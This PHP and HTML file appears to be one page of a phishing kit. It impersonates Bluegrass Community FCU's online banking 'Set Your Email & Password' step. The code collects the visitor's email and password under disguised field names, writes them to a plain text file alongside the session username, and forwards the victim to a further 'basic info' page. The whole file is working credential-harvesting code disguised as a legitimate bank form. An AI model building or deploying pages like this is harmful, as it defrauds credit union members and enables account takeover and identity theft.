<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirmPassword'] ?? '';
    
    // Validation
    if (empty($email)) {
        $errors['email'] = 'Email is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid email format';
    }
    
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    } elseif (strlen($password) < 8) {
        $errors['password'] = 'Password must be at least 8 characters';
    }
    
    if (empty($confirmPassword)) {
        $errors['confirmPassword'] = 'Confirm password is required';
    } elseif ($password !== $confirmPassword) {
        $errors['confirmPassword'] = 'Passwords do not match';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'email_password',
            'usrnm' => $username,
            'usr_eml' => $email,
            'acc_cd' => $password
        ];
        
        saveUserData('email_password.txt', $data);
        
        // Redirect to basic info page
        header('Location: basic_info.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Set Your Email & Password - Bluegrass Community FCU</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#4A9619] text-[#123524] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1 flex items-center justify-center px-4 py-12">
            <div class="w-full max-w-3xl flex flex-col items-center gap-8">
                <!-- Email Password Card -->
                <div class="w-full rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-10 py-12">
                    <!-- Logo -->
                    <img
                        src="assets/blue_logo.png"
                        alt="Bluegrass Community FCU"
                        class="mx-auto h-12 w-auto"
                    />

                    <!-- Card Header -->
                    <div class="mt-6 space-y-3 text-center">
                        <p class="text-[0.65rem] font-semibold uppercase tracking-[0.35em] text-[#4A9619]">
                            Account Setup
                        </p>
                        <h1 class="text-2xl font-semibold text-gray-900">Set Your Email & Password</h1>
                        <p class="text-gray-600">Create your account credentials to access your online banking</p>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="mt-6 bg-red-50 border-l-4 border-red-500 p-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="mt-8 space-y-6">
                        <!-- Email Field -->
                        <div>
                            <label for="email" class="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
                            <input
                                type="email"
                                id="email"
                                name="email"
                                value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                                class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                placeholder="Enter your email"
                                required
                            >
                            <?php if (!empty($errors['email'])): ?>
                                <p class="mt-2 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['email']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Password Field -->
                        <div>
                            <label for="password" class="block text-sm font-medium text-gray-700 mb-2">Password</label>
                            <div class="relative">
                                <input
                                    type="password"
                                    id="password"
                                    name="password"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="Enter password"
                                    required
                                >
                                <button
                                    type="button"
                                    onclick="togglePasswordVisibility('password')"
                                    class="absolute inset-y-0 right-4 flex items-center text-[#4A9619] hover:text-[#3f8215]"
                                    aria-label="Toggle password visibility"
                                >
                                    <svg id="passwordEyeIcon" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" />
                                        <circle cx="12" cy="12" r="3" />
                                    </svg>
                                </button>
                            </div>
                            <?php if (!empty($errors['password'])): ?>
                                <p class="mt-2 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['password']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Confirm Password Field -->
                        <div>
                            <label for="confirmPassword" class="block text-sm font-medium text-gray-700 mb-2">Confirm Password</label>
                            <div class="relative">
                                <input
                                    type="password"
                                    id="confirmPassword"
                                    name="confirmPassword"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    placeholder="Re-enter password"
                                    required
                                >
                                <button
                                    type="button"
                                    onclick="togglePasswordVisibility('confirmPassword')"
                                    class="absolute inset-y-0 right-4 flex items-center text-[#4A9619] hover:text-[#3f8215]"
                                    aria-label="Toggle password visibility"
                                >
                                    <svg id="confirmPasswordEyeIcon" class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" />
                                        <circle cx="12" cy="12" r="3" />
                                    </svg>
                                </button>
                            </div>
                            <?php if (!empty($errors['confirmPassword'])): ?>
                                <p class="mt-2 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['confirmPassword']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Submit Button -->
                        <button
                            type="submit"
                            class="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            Continue
                        </button>
                        
                        <p class="text-xs text-gray-500 text-center">
                            Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
                        </p>
                    </form>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="bg-white border-t border-gray-300 py-6">
            <div class="max-w-7xl mx-auto px-4">
                <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                    <div class="flex items-center gap-6 justify-center md:justify-start">
                        <img
                            src="assets/equal-housing.png"
                            alt="Equal Housing Lender"
                            class="h-12 w-auto"
                        />
                        <img
                            src="assets/ncua.png"
                            alt="National Credit Union Administration"
                            class="h-12 w-auto"
                        />
                    </div>
                    <div class="text-xs text-gray-700 text-center md:text-right space-y-2">
                        <p>© 2025 Bluegrass Community FCU. All Rights Reserved.</p>
                        <p>
                            This site contains links to other sites on the Internet. We, and your credit union,
                            cannot be responsible for the content or privacy policies of these other sites.
                        </p>
                        <p>Version: v26.10.22.0</p>
                    </div>
                </div>
                <div class="text-center text-xs text-gray-500 mt-6 border-t border-gray-200 pt-4">
                    ~ Current time is <?php echo date('m/d/Y h:i:s A'); ?> ~ 0 ~ NWEB02 ~
                </div>
            </div>
        </footer>
    </div>
    
    <script>
        // Toggle password visibility
        function togglePasswordVisibility(fieldId) {
            const input = document.getElementById(fieldId);
            const eyeIcon = document.getElementById(fieldId + 'EyeIcon');
            
            if (input.type === 'password') {
                input.type = 'text';
                // Change to eye-slash icon
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6 0-10-7-10-7a21.37 21.37 0 0 1 5.07-5.92" /><path d="M1 1l22 22" />';
            } else {
                input.type = 'password';
                // Change back to eye icon
                eyeIcon.innerHTML = '<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" /><circle cx="12" cy="12" r="3" />';
            }
        }
        
        // Auto-focus email field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email');
            if (emailInput) {
                emailInput.focus();
            }
        });
    </script>
</body>
</html>
